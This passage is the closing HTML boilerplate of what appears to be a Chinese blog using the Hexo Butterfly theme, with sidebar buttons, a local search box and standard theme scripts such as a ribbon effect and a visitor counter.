fa-minus"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>